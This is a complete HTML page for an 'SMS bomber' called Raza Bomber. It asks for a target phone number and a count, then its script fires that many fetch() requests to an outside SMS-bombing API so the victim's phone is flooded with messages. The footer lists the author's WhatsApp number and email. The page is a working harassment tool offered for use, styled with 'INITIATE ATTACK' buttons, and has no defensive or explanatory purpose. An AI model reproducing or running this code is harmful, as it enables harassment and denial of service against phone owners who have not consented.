<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Raza Bomber</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      background: #0a0a0a;
      color: #00ff00;
      font-family: 'Courier New', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    h1 {
      text-align: center;
      font-size: 3em;
      color: #00ff00;
      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
    }

    .container {
      background: rgba(0, 0, 0, 0.9);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px #00ff00;
      width: 100%;
      max-width: 400px;
      margin-top: 30px;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      background: #111;
      color: #00ff00;
      border: 2px solid #00ff00;
      border-radius: 8px;
      font-size: 16px;
    }

    input::placeholder {
      color: #00ff00;
      opacity: 0.6;
    }

    button {
      background: #000;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: #00ff00;
      color: black;
      box-shadow: 0 0 10px #00ff00;
    }

    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 14px;
      color: #ccc;
    }

    .footer a {
      color: #ff0040;
      text-decoration: none;
      font-weight: bold;
    }

    .footer a:hover {
      color: #ff0000;
      text-shadow: 0 0 5px #ff0000;
    }

    /* Custom Popup Styles */
    #popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #popup-content {
      background: #111;
      color: #00ff00;
      padding: 25px 35px;
      border-radius: 12px;
      box-shadow: 0 0 15px #00ff00;
      text-align: center;
    }

    #popup-content button {
      margin-top: 15px;
      padding: 10px 20px;
      background-color: #00ff00;
      border: none;
      color: black;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    #popup-content button:hover {
      background-color: #0f0;
    }
  </style>
</head>
<body>

  <h1>💀Raza<br>Bomber💣</h1>

  <div class="container">
    <input type="text" id="number" placeholder="Target Number e.g. 03001234567" />
    <input type="number" id="count" placeholder="How many bombs?" />
    <button onclick="startBombing()">💣 INITIATE ATTACK</button>
  </div>

  <div class="footer">
    <p>💬 Message Me: 
      <a href="https://wa.me/447354208303?text=Hello%20%F0%9F%A4%97" target="_blank">
        WhatsApp (+44 7354 208303)
      </a>
    </p>
    <p>📧 Email: <a href="mailto:alijanhunyaar@gmail.com">alijanhunyaar@gmail.com</a></p>
  </div>

  <!-- Custom Popup -->
  <div id="popup">
    <div id="popup-content">
      <p>💣 Attack sequence started.</p>
      <button onclick="closePopup()">OK</button>
    </div>
  </div>

  <script>
    function startBombing() {
      const numberInput = document.getElementById('number').value.trim();
      const count = parseInt(document.getElementById('count').value);

      if (!numberInput || isNaN(count) || count <= 0) {
        alert("⚠️ Enter valid number and count.");
        return;
      }

      let number = numberInput;
      if (number.startsWith("03")) {
        number = "92" + number.slice(1);
      }

      for (let i = 0; i < count; i++) {
        fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`)
          .catch(() => {});
      }

      showPopup(); // 👈 Replaced alert with custom popup
    }

    function showPopup() {
      document.getElementById('popup').style.display = 'flex';
    }

    function closePopup() {
      document.getElementById('popup').style.display = 'none';
    }
  </script>

</body>
</html>
